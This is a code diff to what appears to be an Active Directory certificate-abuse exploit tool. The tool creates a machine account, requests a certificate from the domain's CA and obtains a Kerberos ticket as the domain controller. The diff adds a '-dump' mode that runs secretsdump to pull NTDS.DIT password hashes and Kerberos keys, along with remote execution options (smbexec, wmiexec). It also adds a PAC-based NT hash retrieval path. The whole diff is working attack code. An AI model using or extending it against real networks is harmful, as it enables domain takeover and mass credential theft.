@@ -8,6 +8,7 @@ from utils.secretsdump import DumpSecrets
 from utils.helpers import *
 from utils.certi import main_req
 from utils.gettgtpkinit import amain
+from utils.getnthash import GETPAC
 
 import argparse
 import sys
@@ -178,16 +179,34 @@ class Exploit:
             # request certificate template for the newly created machine from the service
             # require service lunar-LUNDC-CA
             # require template machine
-            # require username 
+            # require username
+
             cert_pass = ''.join(random.choice(list(string.ascii_letters + string.digits + "!@#$%^&*()")) for _ in range(12))
             
-            main_req(self.options,ca_host,ca_service,new_computer_name,new_computer_password,domain,lmhash,nthash,cert_pass)
-
-            amain(self.options,cert_pass,f'{new_computer_name}.pfx',domain,f'{dc_host}$')
-
+            try:
+                pfx_bytes = main_req(self.options,ca_host,ca_service,new_computer_name,new_computer_password,domain,lmhash,nthash,cert_pass)
+                enc_key = amain(self.options,cert_pass,f'{new_computer_name}.pfx',domain,f'{dc_host}$')
+                logging.info(f'Encryption key retrieved: {enc_key}')
+            except:
+                return
+            
             os.environ['KRB5CCNAME'] = f'{dc_host}$.ccache'
 
-
+            if self.options.dump:
+                try:
+                    self.options.k = True
+                    self.options.target_ip = self.options.dc_ip
+                    self.options.system = self.options.bootkey = self.options.security = self.options.system = self.options.ntds = self.options.sam = self.options.resumefile = self.options.outputfile = None
+                    dumper = DumpSecrets(dcfull, '', '',domain, self.options)
+                    dumper.dump()
+                except Exception as e:
+                    if logging.getLogger().level == logging.DEBUG:
+                        import traceback
+                        traceback.print_exc()
+                    logging.error(str(e))
+            else:
+                dumper = GETPAC(username,domain,enc_key,self.options)
+                dumper.dump()
 
 
 
@@ -235,6 +254,7 @@ def main():
     parser.add_argument('-old-pass', action='store', metavar='PASSWORD', help='Target computer password, use if you know the password of the target you input with -target-name.')
     parser.add_argument('-old-hash', action='store', metavar='LMHASH:NTHASH', help='Target computer hashes, use if you know the hash of the target you input with -target-name.')
     parser.add_argument('-use-ldap', action='store_true', help='Use LDAP instead of LDAPS')
+    parser.add_argument('-dump', action='store_true', help='Dump Hashs via secretsdump')
 
     group = parser.add_argument_group('authentication')
     group.add_argument('-dc-ip', action='store',metavar = "ip",  help='IP of the domain controller to use. '
@@ -260,6 +280,27 @@ def main():
     exec =  parser.add_argument_group('execute options')
     exec.add_argument('-port', choices=['139', '445'], nargs='?', default='445', metavar="destination port",
                        help='Destination port to connect to SMB Server')
+
+    dumper =  parser.add_argument_group('dump options')
+    dumper.add_argument('-just-dc-user', action='store', metavar='USERNAME',
+                       help='Extract only NTDS.DIT data for the user specified. Only available for DRSUAPI approach. '
+                            'Implies also -just-dc switch')
+    dumper.add_argument('-just-dc', action='store_true', default=False,
+                        help='Extract only NTDS.DIT data (NTLM hashes and Kerberos keys)')
+    dumper.add_argument('-just-dc-ntlm', action='store_true', default=False,
+                       help='Extract only NTDS.DIT data (NTLM hashes only)')
+    dumper.add_argument('-pwd-last-set', action='store_true', default=False,
+                       help='Shows pwdLastSet attribute for each NTDS.DIT account. Doesn\'t apply to -outputfile data')
+    dumper.add_argument('-user-status', action='store_true', default=False,
+                        help='Display whether or not the user is disabled')
+    dumper.add_argument('-history', action='store_true', help='Dump password history, and LSA secrets OldVal')
+    dumper.add_argument('-resumefile', action='store', help='resume file name to resume NTDS.DIT session dump (only '
+                         'available to DRSUAPI approach). This file will also be used to keep updating the session\'s '
+                         'state')
+    dumper.add_argument('-use-vss', action='store_true', default=False,
+                        help='Use the VSS method insead of default DRSUAPI')
+    dumper.add_argument('-exec-method', choices=['smbexec', 'wmiexec', 'mmcexec'], nargs='?', default='smbexec', help='Remote exec '
+                        'method to use at target (only when using -use-vss). Default: smbexec')
 
     if len(sys.argv)==1:
         parser.print_help()
